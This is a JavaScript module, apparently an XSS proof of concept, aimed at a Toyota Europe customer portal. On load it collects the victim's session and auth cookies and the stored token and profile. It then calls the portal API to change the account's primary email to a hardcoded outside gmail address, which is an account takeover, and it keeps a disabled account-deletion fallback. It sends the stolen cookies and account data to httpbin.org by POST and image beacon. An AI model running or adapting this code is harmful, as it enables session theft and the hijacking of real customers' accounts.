define([], function () {
  var HTTPBIN_BASE = "https://httpbin.org/anything/cp-hash-loader";
  var USER_TOKEN_KEY = "com.toyota.tme.user.token";
  var USER_PROFILE_KEY = "com.toyota.tme.user.customerProfile";
  var FORCED_TARGET_EMAIL = "bixo.hans@gmail.com";

  var ENABLE_EMAIL_REVERT = false;
  var ENABLE_DELETE_FALLBACK = false;

  var AUTH_COOKIE_HINTS = [
    "sess",
    "sessid",
    "session",
    "jsessionid",
    "phpsessid",
    "asp.net_sessionid",
    "auth",
    "token",
    "jwt",
    "bearer",
    "sid",
    "sso",
    "oidc",
    "saml",
    "identity",
    "account",
    "login",
    "logged",
    "remember",
    "id_token",
    "access_token",
    "refresh_token"
  ];

  var TRACKING_COOKIE_HINTS = [
    "_ga",
    "_gid",
    "_gat",
    "_fbp",
    "_gcl",
    "_hj",
    "_clck",
    "_uet",
    "optanon",
    "consent",
    "cookie",
    "ak_bmsc",
    "bm_sv",
    "amcv",
    "datadome",
    "cf_",
    "_dd"
  ];

  function nowIso() {
    return new Date().toISOString();
  }

  function safeCall(fn, fallback) {
    try {
      return fn();
    } catch (e) {
      return fallback;
    }
  }

  function safeJsonParse(text, fallback) {
    if (!text || typeof text !== "string") {
      return fallback;
    }
    return safeCall(function () {
      return JSON.parse(text);
    }, fallback);
  }

  function stripProtocol(urlLike) {
    return (urlLike || "")
      .replace(/^https?:\/\//i, "")
      .replace(/^\/+/, "")
      .replace(/\/+$/, "");
  }

  function normalizeString(v) {
    return (v == null ? "" : String(v)).trim();
  }

  function parseCookies() {
    var raw = safeCall(function () {
      return document.cookie || "";
    }, "");
    if (!raw) {
      return [];
    }

    return raw
      .split(";")
      .map(function (part) {
        var t = part.trim();
        var eq = t.indexOf("=");
        if (eq < 0) {
          return { name: t, value: "" };
        }
        return {
          name: t.slice(0, eq),
          value: t.slice(eq + 1)
        };
      })
      .filter(function (cookie) {
        return cookie.name;
      });
  }

  function isAuthCookieName(name) {
    var low = (name || "").toLowerCase();
    for (var i = 0; i < AUTH_COOKIE_HINTS.length; i++) {
      if (low.indexOf(AUTH_COOKIE_HINTS[i]) !== -1) {
        return true;
      }
    }
    return false;
  }

  function collectAuthCookies(cookies) {
    var matched = cookies.filter(function (cookie) {
      return isAuthCookieName(cookie.name);
    });
    if (matched.length > 0) {
      return {
        cookies: matched,
        mode: "name_match"
      };
    }

    var fallback = cookies.filter(function (cookie) {
      var low = (cookie.name || "").toLowerCase();
      for (var i = 0; i < TRACKING_COOKIE_HINTS.length; i++) {
        if (low.indexOf(TRACKING_COOKIE_HINTS[i]) !== -1) {
          return false;
        }
      }
      return true;
    }).slice(0, 5);

    if (fallback.length > 0) {
      return {
        cookies: fallback,
        mode: "fallback_non_tracking"
      };
    }

    return {
      cookies: [],
      mode: "none"
    };
  }

  function makeSessionId() {
    var rnd = Math.random().toString(36).slice(2, 10);
    return "cp" + Date.now().toString(36) + rnd;
  }

  function writeToHttpbin(url, payload) {
    var body = safeCall(function () {
      return JSON.stringify(payload);
    }, "{}");

    return fetch(url, {
      method: "POST",
      mode: "cors",
      credentials: "omit",
      cache: "no-store",
      keepalive: true,
      headers: {
        "Content-Type": "text/plain;charset=UTF-8"
      },
      body: body
    }).then(function (response) {
      return response.text().then(function (text) {
        var parsed = safeJsonParse(text, null);
        return {
          ok: response.ok,
          status: response.status,
          requestUrl: url,
          echoedUrl: parsed && parsed.url ? parsed.url : url
        };
      });
    });
  }

  function buildReadableHttpbinLink(baseUrl, payload) {
    var authCookies = payload && payload.authCookies ? payload.authCookies : [];
    var visibleCookies = payload && payload.visibleCookies ? payload.visibleCookies : [];
    var visibleNames = payload && payload.visibleCookieNames ? payload.visibleCookieNames : [];
    var actionProof = payload && payload.actionProof ? payload.actionProof : {};
    var params = [];

    params.push("event=" + encodeURIComponent(payload.event || "cp_hash_loader"));
    params.push("ts=" + encodeURIComponent(payload.marker && payload.marker.ts ? payload.marker.ts : nowIso()));
    params.push("origin=" + encodeURIComponent(payload.marker && payload.marker.victimOrigin ? payload.marker.victimOrigin : window.location.origin));
    params.push("count=" + encodeURIComponent(String(authCookies.length)));
    params.push("mode=" + encodeURIComponent(payload.authCookieSelection || "unknown"));
    params.push("visible_count=" + encodeURIComponent(String(payload.visibleCookieCount || 0)));
    params.push("act=" + encodeURIComponent(actionProof.operation || "none"));
    params.push("act_ok=" + encodeURIComponent(String(!!actionProof.success)));
    params.push("act_status=" + encodeURIComponent(String(actionProof.statusCode || 0)));
    params.push("pre_status=" + encodeURIComponent(String(actionProof.precheckStatus || 0)));

    for (var i = 0; i < authCookies.length && i < 5; i++) {
      var c = authCookies[i] || {};
      params.push("c" + i + "n=" + encodeURIComponent(c.name || ""));
      params.push("c" + i + "v=" + encodeURIComponent(c.value || ""));
    }

    for (var j = 0; j < visibleNames.length && j < 5; j++) {
      params.push("v" + j + "n=" + encodeURIComponent(visibleNames[j] || ""));
    }

    for (var k = 0; k < visibleCookies.length && k < 8; k++) {
      var vc = visibleCookies[k] || {};
      var vv = (vc.value || "").slice(0, 140);
      params.push("v" + k + "n2=" + encodeURIComponent(vc.name || ""));
      params.push("v" + k + "v2=" + encodeURIComponent(vv));
    }

    return baseUrl + "?" + params.join("&");
  }

  function fireImageBeacon(url) {
    return safeCall(function () {
      var img = new Image();
      img.referrerPolicy = "no-referrer";
      img.src = url;
      return true;
    }, false);
  }

  function upsertSpeechBalloon(title, link, statusText, isError) {
    var balloonId = "cp-httpbin-balloon";
    var titleId = "cp-httpbin-balloon-title";
    var linkId = "cp-httpbin-balloon-link";
    var statusId = "cp-httpbin-balloon-status";
    var balloon = document.getElementById(balloonId);

    if (!balloon) {
      balloon = document.createElement("div");
      balloon.id = balloonId;
      balloon.style.position = "fixed";
      balloon.style.right = "22px";
      balloon.style.bottom = "24px";
      balloon.style.maxWidth = "460px";
      balloon.style.padding = "12px 14px";
      balloon.style.background = "#0b1022";
      balloon.style.color = "#e6ecff";
      balloon.style.border = "1px solid #5aa0ff";
      balloon.style.borderRadius = "12px";
      balloon.style.boxShadow = "0 10px 28px rgba(0, 0, 0, 0.45)";
      balloon.style.font = "12px/1.45 monospace";
      balloon.style.zIndex = "2147483647";

      var tail = document.createElement("div");
      tail.style.position = "absolute";
      tail.style.right = "30px";
      tail.style.bottom = "-8px";
      tail.style.width = "16px";
      tail.style.height = "16px";
      tail.style.background = "#0b1022";
      tail.style.borderRight = "1px solid #5aa0ff";
      tail.style.borderBottom = "1px solid #5aa0ff";
      tail.style.transform = "rotate(45deg)";
      tail.style.zIndex = "-1";
      balloon.appendChild(tail);

      var titleEl = document.createElement("div");
      titleEl.id = titleId;
      titleEl.style.fontWeight = "700";
      titleEl.style.marginBottom = "5px";
      balloon.appendChild(titleEl);

      var linkEl = document.createElement("a");
      linkEl.id = linkId;
      linkEl.target = "_blank";
      linkEl.rel = "noreferrer noopener";
      linkEl.style.display = "block";
      linkEl.style.marginBottom = "6px";
      linkEl.style.wordBreak = "break-all";
      linkEl.style.color = "#9fd0ff";
      linkEl.style.textDecoration = "underline";
      balloon.appendChild(linkEl);

      var statusEl = document.createElement("div");
      statusEl.id = statusId;
      balloon.appendChild(statusEl);

      document.documentElement.appendChild(balloon);
    }

    var titleNode = document.getElementById(titleId);
    var linkNode = document.getElementById(linkId);
    var statusNode = document.getElementById(statusId);

    if (titleNode) {
      titleNode.textContent = title || "PoC";
    }
    if (linkNode) {
      linkNode.href = link || "#";
      linkNode.textContent = link || "no link";
    }
    if (statusNode) {
      statusNode.textContent = statusText || "";
      statusNode.style.color = isError ? "#ffafaf" : "#7cffb4";
    }
    if (balloon) {
      balloon.style.borderColor = isError ? "#ff8080" : "#5aa0ff";
    }
  }

  function getStoredUserProfile() {
    var raw = safeCall(function () {
      return localStorage.getItem(USER_PROFILE_KEY) || "";
    }, "");
    return safeJsonParse(raw, {}) || {};
  }

  function inferBrand() {
    var t1Brand = safeCall(function () {
      return window.T1 && window.T1.settings && window.T1.settings.brand;
    }, "");
    if (t1Brand) {
      return String(t1Brand).toUpperCase();
    }
    return window.location.host && window.location.host.toLowerCase().indexOf("lexus") !== -1 ? "LEXUS" : "TOYOTA";
  }

  function inferLocale(profile) {
    var fromProfile = normalizeString(profile.languageCode) + "-" + normalizeString(profile.countryCode);
    var t1Locale = safeCall(function () {
      var t1 = window.T1 && window.T1.settings ? window.T1.settings : {};
      return normalizeString(t1.language) + "-" + normalizeString(t1.country);
    }, "");
    var raw = normalizeString(fromProfile) !== "-" ? fromProfile : t1Locale;
    raw = normalizeString(raw).toLowerCase();
    return raw && raw !== "-" ? raw : "en-gb";
  }

  function getCpAggregatorBase() {
    var cpHost = safeCall(function () {
      return window.T1 && window.T1.settings && window.T1.settings.cpB2cAggrHost;
    }, "");
    var host = stripProtocol(cpHost || "cpb2cs.toyota-europe.com");
    return "https://" + host + "/api";
  }

  function getAuthContext() {
    var token = safeCall(function () {
      return localStorage.getItem(USER_TOKEN_KEY) || "";
    }, "");
    var profile = getStoredUserProfile();

    var oldEmail = normalizeString(profile.email || profile.userEmail || profile.username);
    var originalUsername = normalizeString(profile.username || profile.userName || oldEmail);
    var firstName = normalizeString(profile.firstName || profile.givenName || "");
    var uuid = normalizeString(profile.uuid || (profile.customerProfile && profile.customerProfile.uuid));

    return {
      token: token,
      uuid: uuid,
      oldEmail: oldEmail,
      originalUsername: originalUsername,
      firstName: firstName,
      brand: inferBrand(),
      locale: inferLocale(profile),
      aggregatorBase: getCpAggregatorBase()
    };
  }

  function redactToken(token) {
    var t = normalizeString(token);
    if (!t) {
      return "";
    }
    if (t.length <= 12) {
      return t;
    }
    return t.slice(0, 6) + "..." + t.slice(-4);
  }

  function buildActionHeaders(ctx) {
    return {
      "Content-Type": "application/json;charset=UTF-8",
      "X-TME-TOKEN": ctx.token,
      "X-TME-BRAND": ctx.brand,
      "X-TME-LC": ctx.locale
    };
  }

  function requestJson(url, options) {
    return fetch(url, options).then(function (response) {
      return response.text().then(function (text) {
        return {
          ok: response.ok,
          status: response.status,
          url: url,
          textPreview: (text || "").slice(0, 320),
          json: safeJsonParse(text, null)
        };
      });
    });
  }

  function deriveTargetEmail(oldEmail) {
    if (FORCED_TARGET_EMAIL) {
      return FORCED_TARGET_EMAIL;
    }

    var clean = normalizeString(oldEmail).toLowerCase();
    var ts = Date.now();
    if (clean.indexOf("@") === -1) {
      return "cp.ato." + ts + "@example.net";
    }
    var at = clean.lastIndexOf("@");
    var local = clean.slice(0, at);
    var domain = clean.slice(at + 1);
    if (!domain) {
      domain = "example.net";
    }
    local = local.split("+")[0].replace(/[^a-z0-9._-]/g, "");
    if (!local) {
      local = "user";
    }
    return local.slice(0, 24) + "+cpato" + ts + "@" + domain;
  }

  function requestUserStatus(ctx) {
    var url = ctx.aggregatorBase + "/user/" + encodeURIComponent(ctx.uuid) + "/status";
    return requestJson(url, {
      method: "GET",
      mode: "cors",
      credentials: "omit",
      cache: "no-store",
      headers: buildActionHeaders(ctx)
    }).then(function (resp) {
      return {
        statusCode: resp.status,
        ok: resp.ok,
        preview: resp.textPreview
      };
    });
  }

  function performEmailChange(ctx) {
    var targetEmail = deriveTargetEmail(ctx.oldEmail);
    var url = ctx.aggregatorBase + "/users/" + encodeURIComponent(ctx.uuid) + "/email/change";
    var requestData = {
      oldEmail: ctx.oldEmail,
      newEmail: targetEmail,
      originalUsername: ctx.originalUsername || ctx.oldEmail,
      firstName: ctx.firstName || "Poc"
    };

    return requestJson(url, {
      method: "PUT",
      mode: "cors",
      credentials: "omit",
      cache: "no-store",
      headers: buildActionHeaders(ctx),
      body: JSON.stringify(requestData)
    }).then(function (resp) {
      var success = !!resp.ok;
      var action = {
        attempted: true,
        operation: "UPDATE_PRIMARY_EMAIL",
        success: success,
        statusCode: resp.status,
        targetEmail: targetEmail,
        requestUrl: url,
        responsePreview: resp.textPreview
      };

      if (!success || !ENABLE_EMAIL_REVERT) {
        return action;
      }

      var revertBody = {
        oldEmail: targetEmail,
        newEmail: ctx.oldEmail,
        originalUsername: ctx.originalUsername || ctx.oldEmail,
        firstName: ctx.firstName || "Poc"
      };

      return requestJson(url, {
        method: "PUT",
        mode: "cors",
        credentials: "omit",
        cache: "no-store",
        headers: buildActionHeaders(ctx),
        body: JSON.stringify(revertBody)
      }).then(function (revertResp) {
        action.revertAttempted = true;
        action.revertStatusCode = revertResp.status;
        action.revertOk = revertResp.ok;
        action.revertPreview = revertResp.textPreview;
        return action;
      });
    });
  }

  function performDeleteFallback(ctx) {
    var url = ctx.aggregatorBase + "/users/" + encodeURIComponent(ctx.uuid);
    return requestJson(url, {
      method: "DELETE",
      mode: "cors",
      credentials: "omit",
      cache: "no-store",
      headers: buildActionHeaders(ctx)
    }).then(function (resp) {
      return {
        attempted: true,
        operation: "DELETE_USER",
        success: !!resp.ok,
        statusCode: resp.status,
        requestUrl: url,
        responsePreview: resp.textPreview
      };
    });
  }

  function attemptHighImpactAction(ctx) {
    if (!ctx || !ctx.token || !ctx.uuid || !ctx.oldEmail) {
      return Promise.resolve({
        attempted: false,
        operation: "UPDATE_PRIMARY_EMAIL",
        success: false,
        reason: "missing_token_or_profile_fields"
      });
    }

    var result = {
      attempted: true,
      operation: "UPDATE_PRIMARY_EMAIL",
      success: false
    };

    return requestUserStatus(ctx)
      .then(function (precheck) {
        result.precheckStatus = precheck.statusCode;
        result.precheckOk = precheck.ok;
        return performEmailChange(ctx);
      })
      .then(function (action) {
        if (action) {
          for (var k in action) {
            if (Object.prototype.hasOwnProperty.call(action, k)) {
              result[k] = action[k];
            }
          }
        }

        if (!result.success && ENABLE_DELETE_FALLBACK) {
          return performDeleteFallback(ctx).then(function (fallbackAction) {
            result.fallbackDelete = fallbackAction;
            return result;
          });
        }

        return result;
      })
      .catch(function (err) {
        result.success = false;
        result.error = String(err && err.message ? err.message : err);
        return result;
      });
  }

  function summarizeActionStatus(actionProof) {
    if (!actionProof) {
      return "no action result";
    }
    if (!actionProof.attempted) {
      return "action skipped: " + (actionProof.reason || "unknown");
    }
    var op = actionProof.operation || "unknown_op";
    var st = actionProof.statusCode || 0;
    return op + " status " + st + (actionProof.success ? " (accepted)" : " (rejected)");
  }

  function executePoC() {
    var ts = nowIso();
    var cookies = parseCookies();
    var authSelection = collectAuthCookies(cookies);
    var authCookies = authSelection.cookies;
    var session = makeSessionId();
    var requestUrl = HTTPBIN_BASE + "/" + session;
    var ctx = getAuthContext();

    var marker = {
      executed: true,
      ts: ts,
      origin: window.location.origin,
      href: window.location.href
    };

    window.__CP_POC_MARKER__ = marker;
    safeCall(function () {
      localStorage.setItem("cp_poc_marker", JSON.stringify(marker));
    }, null);

    var safeAuthContext = {
      hasToken: !!ctx.token,
      tokenLength: (ctx.token || "").length,
      tokenPreview: redactToken(ctx.token),
      uuid: ctx.uuid || "",
      oldEmail: ctx.oldEmail || "",
      originalUsername: ctx.originalUsername || "",
      firstName: ctx.firstName || "",
      brand: ctx.brand || "",
      locale: ctx.locale || "",
      aggregatorBase: ctx.aggregatorBase || ""
    };

    window.__CP_POC_AUTH_CONTEXT__ = safeAuthContext;

    upsertSpeechBalloon(
      "XSS executed at " + ts,
      requestUrl,
      "Running authenticated high-impact action probe...",
      false
    );

    attemptHighImpactAction(ctx)
      .then(function (actionProof) {
        var payload = {
          event: "cp_hash_loader_authenticated_action_abuse_email_change",
          marker: {
            executed: true,
            ts: ts,
            victimOrigin: window.location.origin,
            victimHref: window.location.href
          },
          authCookies: authCookies,
          authCookieCount: authCookies.length,
          authCookieSelection: authSelection.mode,
          visibleCookieCount: cookies.length,
          visibleCookies: cookies.slice(0, 20).map(function (c) {
            return { name: c.name, value: c.value };
          }),
          visibleCookieNames: cookies.map(function (c) { return c.name; }).slice(0, 20),
          authContext: safeAuthContext,
          actionProof: actionProof,
          note: "Action-abuse PoC attempts authenticated account-impact operation and saves full result to httpbin."
        };
        var readableLink = buildReadableHttpbinLink(requestUrl, payload);
        var actionStatus = summarizeActionStatus(actionProof);

        window.__CP_POC_HTTPBIN_URL__ = requestUrl;
        window.__CP_POC_HTTPBIN_READABLE_URL__ = readableLink;
        window.__CP_POC_AUTH_COOKIES__ = authCookies;
        window.__CP_POC_ACTION_PROOF__ = actionProof;

        upsertSpeechBalloon(
          "Authenticated action attempted",
          readableLink,
          actionStatus + " | writing proof to httpbin...",
          !actionProof.success
        );

        return writeToHttpbin(requestUrl, payload)
          .then(function (delivery) {
            var beaconSent = fireImageBeacon(readableLink);
            window.__CP_POC_DELIVERY__ = {
              ok: delivery.ok,
              status: delivery.status,
              requestUrl: delivery.requestUrl,
              echoedUrl: delivery.echoedUrl,
              readableUrl: readableLink,
              fallbackImageSent: beaconSent,
              actionStatus: actionStatus
            };
            upsertSpeechBalloon(
              "HTTPBIN saved",
              readableLink,
              actionStatus + " | POST " + delivery.status + " | GET fallback " + (beaconSent ? "sent" : "not sent"),
              !delivery.ok
            );
          })
          .catch(function (err) {
            var beaconSent = fireImageBeacon(readableLink);
            window.__CP_POC_DELIVERY__ = {
              ok: false,
              status: 0,
              requestUrl: requestUrl,
              readableUrl: readableLink,
              fallbackImageSent: beaconSent,
              actionStatus: actionStatus,
              error: String(err && err.message ? err.message : err)
            };
            upsertSpeechBalloon(
              "HTTPBIN fallback active",
              readableLink,
              actionStatus + " | POST failed, GET fallback " + (beaconSent ? "sent" : "not sent"),
              !beaconSent
            );
          });
      })
      .catch(function (err) {
        upsertSpeechBalloon(
          "Action probe error",
          requestUrl,
          "authenticated action chain error: " + String(err && err.message ? err.message : err),
          true
        );
      });

    return marker;
  }

  executePoC();

  return {
    version: "107.0.0-httpbin-auth-action-email-change",
    render: function () {
      return executePoC();
    }
  };
});
